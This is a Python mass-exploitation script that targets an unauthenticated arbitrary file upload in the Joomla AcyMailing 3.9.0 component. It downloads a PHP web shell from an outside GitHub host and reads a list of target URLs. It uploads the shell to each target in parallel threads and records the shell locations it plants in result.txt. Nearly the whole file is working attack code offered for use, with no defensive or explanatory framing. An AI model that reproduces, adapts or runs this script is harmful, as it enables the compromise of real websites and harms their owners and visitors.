import requests as req
import os
import sys
import json
from multiprocessing import Pool
from multiprocessing.dummy import Pool as ThreadPool
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {
  'http': 'http://127.0.0.1:8080',
  'https': 'http://127.0.0.1:8080',
}
user_agent = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"}
shell_content = req.get("https://raw.githubusercontent.com/0x5a455553/MARIJUANA/master/MARIJUANA.php", headers=user_agent).text
def clear():
    linux   = 'cls'
    windows = 'cls'
    os.system([linux, windows][os.name == 'nt'])
def fail(msg):
    error_back = lambda x: "\033[41m\033[97m{}\033[0m\033[0m".format(x)
    print("{} {}".format(error_back("[FAIL]"), msg))
def ok(msg):
    success_back = lambda x: "\033[42m\033[97m{}\033[0m\033[0m".format(x)
    print("{} {}".format(success_back("[OK]"), msg))
def is_json(data):
    try:
      json_object = json.loads(data)
    except ValueError as e:
      return False
    return True
def exploit(url):
    url = url.decode()
    data = {}
    data["option"] = "com_acym"
    data["ctrl"] = "frontmails"
    data["task"] = "setNewIconShare"
    data["social"] = "xxxdddshell"
    try:
        r = req.post(url, data=data, files={"file":("lalala.php", shell_content, "text/php")}, proxies=proxies, verify=False, headers=user_agent)
    except KeyboarInterrupt:
        print("EXITING!!!!!!!!!!")
        sys.exit()
    except Exception as e:
        print("[{}] {}".format(url, e))
        return
    if r.status_code == 200:
        response = r.text
        if "xxxdddshell" in response:
            shell_path = False
            if is_json(response):
                json_url = json.loads(response)
                if json_url.get("url"):
                    shell_path = json_url["url"]
                    ok("{}.php GOTCHAAAAAAA!".format(json_url["url"]))
            else:
                shell_path = response
                ok("{} GOTCHAAAAAAA!".format(response))
            if shell_path:
                with open("result.txt", "a") as newline:
                    newline.write("{}\n".format(shell_path))
                    newline.close()
            else:
                fail("{} not uploaded".format(url))
        else:
            fail("{} not uploaded".format(url))
    else:
        fail("{} not uploaded".format(url))
    return
def main():
    clear()
    banner = """
          __n__n__
   .------`-\\00/-'
  /  ##  ## (oo)
 / \## __   ./
    |//YY \|/
    |||   |||          ^^^ ^
+---------------------------------------------------------------------------------------------+
| Title          : Joomla! ACYMAILING 3.9.0 component - Unauthenticated Arbitrary File Upload |
| Coder          : s4ndal.py                                                                  |
+---------------------------------------------------------------------------------------------+
    """
    print(banner)
    threads = input("[?] Threads > ")
    list_file = input("[?] Lists file > ")
    print("[!] all result saved in result.txt")
    with open(list_file, "rb") as file:
        lines = [line.rstrip() for line in file]
        th = ThreadPool(int(threads))
        th.map(exploit, lines)
main()